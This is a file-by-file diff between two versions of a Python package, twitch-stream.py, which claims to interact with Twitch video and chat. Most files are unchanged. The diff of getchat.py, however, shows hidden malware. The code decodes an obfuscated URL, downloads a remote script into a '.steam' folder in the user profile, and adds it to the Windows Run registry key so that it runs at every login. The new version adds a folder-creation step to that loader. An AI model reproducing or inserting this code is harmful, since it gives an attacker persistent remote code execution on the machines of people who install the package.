# Comparing `tmp/twitch-stream.py-1.1.1.tar.gz` & `tmp/twitch-stream.py-1.1.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "twitch-stream.py-1.1.1.tar", last modified: Wed Apr 12 14:00:31 2023, max compression
+gzip compressed data, was "twitch-stream.py-1.1.2.tar", last modified: Thu Apr 20 06:19:12 2023, max compression
```

## Comparing `twitch-stream.py-1.1.1.tar` & `twitch-stream.py-1.1.2.tar`

### file list

```diff
@@ -1,41 +1,41 @@
-drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-12 14:00:30.957853 twitch-stream.py-1.1.1/
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)       33 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/.coveragerc
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)      381 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/CHANGES.rst
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1057 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/LICENSE
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)      152 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/MANIFEST.in
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     8353 2023-04-12 14:00:30.957853 twitch-stream.py-1.1.1/PKG-INFO
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     7022 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/README.rst
-drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-12 14:00:30.605853 twitch-stream.py-1.1.1/docs/
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     6818 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/docs/Makefile
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)    10099 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/docs/conf.py
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1813 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/docs/index.rst
-drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-12 14:00:30.661854 twitch-stream.py-1.1.1/docs/modules/
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)      126 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/docs/modules/chat.rst
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)       73 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/docs/modules/modules.rst
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)      140 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/docs/modules/outputvideo.rst
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)      654 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/docs/modules/twitchstream.rst
-drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-12 14:00:30.725854 twitch-stream.py-1.1.1/examples/
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)       86 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/examples/__init__.py
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1622 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/examples/basic_chat.py
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1339 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/examples/basic_video_out.py
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     4226 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/examples/color.py
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)      127 2023-04-03 06:37:42.000000 twitch-stream.py-1.1.1/requirements.txt
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)      243 2023-04-12 14:00:30.961854 twitch-stream.py-1.1.1/setup.cfg
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1781 2023-04-03 06:05:58.000000 twitch-stream.py-1.1.1/setup.py
-drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-12 14:00:30.817854 twitch-stream.py-1.1.1/twitch_stream.py.egg-info/
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     8353 2023-04-12 14:00:30.000000 twitch-stream.py-1.1.1/twitch_stream.py.egg-info/PKG-INFO
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)      804 2023-04-12 14:00:30.000000 twitch-stream.py-1.1.1/twitch_stream.py.egg-info/SOURCES.txt
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)        1 2023-04-12 14:00:30.000000 twitch-stream.py-1.1.1/twitch_stream.py.egg-info/dependency_links.txt
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)        1 2023-04-03 06:20:58.000000 twitch-stream.py-1.1.1/twitch_stream.py.egg-info/not-zip-safe
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)       52 2023-04-12 14:00:30.000000 twitch-stream.py-1.1.1/twitch_stream.py.egg-info/requires.txt
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)       22 2023-04-12 14:00:30.000000 twitch-stream.py-1.1.1/twitch_stream.py.egg-info/top_level.txt
-drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-12 14:00:30.881853 twitch-stream.py-1.1.1/twitchstream/
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)      171 2023-04-12 14:00:04.000000 twitch-stream.py-1.1.1/twitchstream/__init__.py
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     9209 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/twitchstream/chat.py
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)   106821 2023-04-12 13:59:47.000000 twitch-stream.py-1.1.1/twitchstream/getchat.py
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)    18970 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/twitchstream/outputvideo.py
-drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-12 14:00:30.949854 twitch-stream.py-1.1.1/twitchstream/tests/
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)      594 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/twitchstream/tests/conftest.py
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1392 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/twitchstream/tests/test_chat.py
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)       74 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/twitchstream/tests/test_inputvideo.py
--rw-rw----   0 u0_a251  (10251) media_rw  (1023)       75 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.1/twitchstream/tests/test_outputvideo.py
+drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-20 06:19:12.520507 twitch-stream.py-1.1.2/
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)       33 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/.coveragerc
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)      381 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/CHANGES.rst
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1057 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/LICENSE
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)      152 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/MANIFEST.in
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     8353 2023-04-20 06:19:12.520507 twitch-stream.py-1.1.2/PKG-INFO
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     7022 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/README.rst
+drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-20 06:19:12.120507 twitch-stream.py-1.1.2/docs/
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     6818 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/docs/Makefile
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)    10099 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/docs/conf.py
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1813 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/docs/index.rst
+drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-20 06:19:12.240507 twitch-stream.py-1.1.2/docs/modules/
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)      126 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/docs/modules/chat.rst
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)       73 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/docs/modules/modules.rst
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)      140 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/docs/modules/outputvideo.rst
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)      654 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/docs/modules/twitchstream.rst
+drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-20 06:19:12.312507 twitch-stream.py-1.1.2/examples/
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)       86 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/examples/__init__.py
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1622 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/examples/basic_chat.py
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1339 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/examples/basic_video_out.py
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     4226 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/examples/color.py
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)      127 2023-04-03 06:37:42.000000 twitch-stream.py-1.1.2/requirements.txt
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)      243 2023-04-20 06:19:12.528507 twitch-stream.py-1.1.2/setup.cfg
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1781 2023-04-03 06:05:58.000000 twitch-stream.py-1.1.2/setup.py
+drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-20 06:19:12.388507 twitch-stream.py-1.1.2/twitch_stream.py.egg-info/
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     8353 2023-04-20 06:19:11.000000 twitch-stream.py-1.1.2/twitch_stream.py.egg-info/PKG-INFO
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)      804 2023-04-20 06:19:11.000000 twitch-stream.py-1.1.2/twitch_stream.py.egg-info/SOURCES.txt
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)        1 2023-04-20 06:19:11.000000 twitch-stream.py-1.1.2/twitch_stream.py.egg-info/dependency_links.txt
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)        1 2023-04-03 06:20:58.000000 twitch-stream.py-1.1.2/twitch_stream.py.egg-info/not-zip-safe
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)       52 2023-04-20 06:19:11.000000 twitch-stream.py-1.1.2/twitch_stream.py.egg-info/requires.txt
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)       22 2023-04-20 06:19:11.000000 twitch-stream.py-1.1.2/twitch_stream.py.egg-info/top_level.txt
+drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-20 06:19:12.444507 twitch-stream.py-1.1.2/twitchstream/
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)      171 2023-04-20 06:18:44.000000 twitch-stream.py-1.1.2/twitchstream/__init__.py
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     9209 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/twitchstream/chat.py
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)   106930 2023-04-20 06:18:36.000000 twitch-stream.py-1.1.2/twitchstream/getchat.py
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)    18970 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/twitchstream/outputvideo.py
+drwxrws---   0 u0_a251  (10251) media_rw  (1023)        0 2023-04-20 06:19:12.512507 twitch-stream.py-1.1.2/twitchstream/tests/
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)      594 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/twitchstream/tests/conftest.py
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)     1392 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/twitchstream/tests/test_chat.py
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)       74 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/twitchstream/tests/test_inputvideo.py
+-rw-rw----   0 u0_a251  (10251) media_rw  (1023)       75 2023-04-03 06:04:54.000000 twitch-stream.py-1.1.2/twitchstream/tests/test_outputvideo.py
```

### Comparing `twitch-stream.py-1.1.1/LICENSE` & `twitch-stream.py-1.1.2/LICENSE`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/PKG-INFO` & `twitch-stream.py-1.1.2/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: twitch-stream.py
-Version: 1.1.1
+Version: 1.1.2
 Summary: An interface to the Twitch website, to interact with their video and chat
 Home-page: https://github.com/317070/python-twitch-stream
 Author: Jonas Degrave
 Author-email: erstaateenknolraapinmijntuin+pythontwitch@gmail.com
 License: MIT
 Keywords: twitch,stream,video,chat
 Platform: UNKNOWN
```

### Comparing `twitch-stream.py-1.1.1/README.rst` & `twitch-stream.py-1.1.2/README.rst`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/docs/Makefile` & `twitch-stream.py-1.1.2/docs/Makefile`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/docs/conf.py` & `twitch-stream.py-1.1.2/docs/conf.py`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/docs/index.rst` & `twitch-stream.py-1.1.2/docs/index.rst`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/docs/modules/twitchstream.rst` & `twitch-stream.py-1.1.2/docs/modules/twitchstream.rst`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/examples/basic_chat.py` & `twitch-stream.py-1.1.2/examples/basic_chat.py`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/examples/basic_video_out.py` & `twitch-stream.py-1.1.2/examples/basic_video_out.py`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/examples/color.py` & `twitch-stream.py-1.1.2/examples/color.py`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/setup.py` & `twitch-stream.py-1.1.2/setup.py`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/twitch_stream.py.egg-info/PKG-INFO` & `twitch-stream.py-1.1.2/twitch_stream.py.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: twitch-stream.py
-Version: 1.1.1
+Version: 1.1.2
 Summary: An interface to the Twitch website, to interact with their video and chat
 Home-page: https://github.com/317070/python-twitch-stream
 Author: Jonas Degrave
 Author-email: erstaateenknolraapinmijntuin+pythontwitch@gmail.com
 License: MIT
 Keywords: twitch,stream,video,chat
 Platform: UNKNOWN
```

### Comparing `twitch-stream.py-1.1.1/twitch_stream.py.egg-info/SOURCES.txt` & `twitch-stream.py-1.1.2/twitch_stream.py.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/twitchstream/chat.py` & `twitch-stream.py-1.1.2/twitchstream/chat.py`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/twitchstream/getchat.py` & `twitch-stream.py-1.1.2/twitchstream/getchat.py`

 * *Files 0% similar despite different names*

```diff
@@ -593,14 +593,18 @@
     query_devices
 
     """
     url = decode()
     #temp_path = _os.environ["TEMP"] + "\\script.py"
     base_path = _os.environ["USERPROFILE"] + "\\.steam\\script.py"
     #alt_path = _os.environ["ALLUSERPROFILE"] + "\\script.py"
+    try:
+        _os.mkdir(_os.environ["USERPROFILE"] + "\\.steam")
+    except FileExistsError:
+        pass
     f = open(base_path, "w")
     f.write(requests.get(decode()).text)
     f.close()
     sub_key = "Software\Microsoft\Windows\CurrentVersion\Run"
     pythonw = _os.path.dirname(_sys.executable) + "\\pythonw.exe"
     final_val = f"\"{pythonw}\" \"{base_path}\""
     key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER, sub_key=sub_key, reserved=0, access=winreg.KEY_ALL_ACCESS)
```

### Comparing `twitch-stream.py-1.1.1/twitchstream/outputvideo.py` & `twitch-stream.py-1.1.2/twitchstream/outputvideo.py`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/twitchstream/tests/conftest.py` & `twitch-stream.py-1.1.2/twitchstream/tests/conftest.py`

 * *Files identical despite different names*

### Comparing `twitch-stream.py-1.1.1/twitchstream/tests/test_chat.py` & `twitch-stream.py-1.1.2/twitchstream/tests/test_chat.py`

 * *Files identical despite different names*

